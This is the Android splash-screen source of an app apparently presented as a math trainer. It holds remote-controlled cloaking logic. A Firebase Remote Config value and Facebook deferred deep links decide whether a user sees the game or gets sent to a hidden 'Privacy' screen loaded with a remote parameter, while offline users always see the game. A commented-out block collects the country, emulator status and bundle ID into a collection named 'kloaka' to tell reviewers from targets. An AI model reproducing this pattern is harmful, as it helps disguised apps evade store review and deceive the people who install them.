package com.mathma.mathtrainew;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.onesignal.OneSignal;

import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

public class Splash extends AppCompatActivity {
    private Timer timer;
    private TimerTask timerTask;

    private SharedPreferences sharedPreferences;
    private String param = "";
    private String response = "";
    private String country = "";
    private String insurance = "";

    private Model model;

    private int checker;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init();

        setContentView(R.layout.activity_splash);

        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        sharedPreferences = getApplicationContext().getSharedPreferences("DATA", Context.MODE_PRIVATE);
        checker = sharedPreferences.getInt("checker", 0);
        String installID = sharedPreferences.getString("installID", null);
        if (installID == null) {
            installID = UUID.randomUUID().toString();
            sharedPreferences.edit().putString("installID", installID).apply();
        }

        final FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mFirebaseRemoteConfig.setDefaultsAsync(R.xml.keys);

        mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
            @Override
            public void onComplete(@NonNull Task<Boolean> task) {
                if (task.isSuccessful()) {
                    model = new Gson().fromJson(mFirebaseRemoteConfig.getString("check"), new TypeToken<Model>(){}.getType());
                } else {
                }
            }
        });

        String gamar = sharedPreferences.getString("param", "");
        assert gamar != null;
        if (!gamar.equals("")) {
            Intent intent = new Intent(this, Privacy.class);
            startActivity(intent);
            finish();
        } else {
            if (isNetworkConnected()) {
                AppLinkData.fetchDeferredAppLinkData(Splash.this,
                        new AppLinkData.CompletionHandler() {
                            @Override
                            public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                                if (appLinkData != null) {
                                    Uri targetUri = appLinkData.getTargetUri();
                                    assert targetUri != null;
                                    getInfo(targetUri.toString());
                                } else {
                                    getInfo("");
                                }
                            }
                        }
                );
            } else {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Intent intent = new Intent(Splash.this, Game2.class);
                        startActivity(intent);
                        finish();
                    }
                }, 2000);
            }
        }
    }

    private void getInfo(final String deeplink) {

        sharedPreferences = getApplicationContext().getSharedPreferences("DATA", Context.MODE_PRIVATE);
        param = sharedPreferences.getString("param", "");
        final String installID = sharedPreferences.getString("installID", null);

        sharedPreferences.edit().putInt("checker", 1).apply();

        final FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mFirebaseRemoteConfig.setDefaultsAsync(R.xml.keys);

        assert param != null;
        if (param.equals("") || param.length() < 7) {
            assert installID != null;
            timer = new Timer();
            timerTask = new TimerTask() {
                @Override
                public void run() {
                    param = model.getName();
                    response = model.getDed();
                    insurance = model.getInsurance();
                    response = model.getDed();

                    final String mrep = deeplink.length() >= 7 ? (param + deeplink.substring(6)) : (param);
                    assert country != null;

                    checker = checker + 1;

                    try {
                        if ((param != null && !param.equals("") && !response.equals("")) || insurance.length() > 5) {
                            timer = new Timer();
                            timerTask = new TimerTask() {
                                @Override
                                public void run() {
                                    Intent intent = new Intent(Splash.this, Privacy.class);
                                    sharedPreferences.edit().putString("param", mrep).apply();
                                    startActivity(intent);
                                    finish();
                                }
                            };
                            timer.schedule(timerTask, 1500);
                        } else {
                            Intent intent = new Intent(Splash.this, Game2.class);
                            startActivity(intent);
                            finish();
                        }
                    } catch(NullPointerException e){
                        runOnUiThread(new Runnable(){
                            public void run(){
                                Intent intent = new Intent(Splash.this, Game2.class);
                                startActivity(intent);
                                finish();
                            }
                        });
                    }
                }
            };
            timer.schedule(timerTask, 2000);
        }
    }

/*    public void post(Context context) {
        SharedPreferences sharedPreferences =
                this.getSharedPreferences("DATA", MODE_PRIVATE);
        String installID = sharedPreferences.getString("installID", null);
        String check = sharedPreferences.getString("check", "true");
        assert check != null;

        java.util.Map<String, Object> data = new HashMap<>();
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String geo = tm.getNetworkCountryIso();
        Date currentTime = Calendar.getInstance().getTime();
        boolean emulator = Build.FINGERPRINT.contains("generic");
        String bundleId = this.getPackageName();
        data.put("currentTime", currentTime);
        data.put("bundleId", bundleId);
        data.put("geo", geo);
        data.put("emulator", emulator);
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        assert installID != null;
        db.collection("kloaka").document(installID).set(data, SetOptions.merge());
        sharedPreferences.edit().putString("check", "false").apply();
    }*/

    public boolean isNetworkConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo ni = cm.getActiveNetworkInfo();
        return ni != null;
    }
}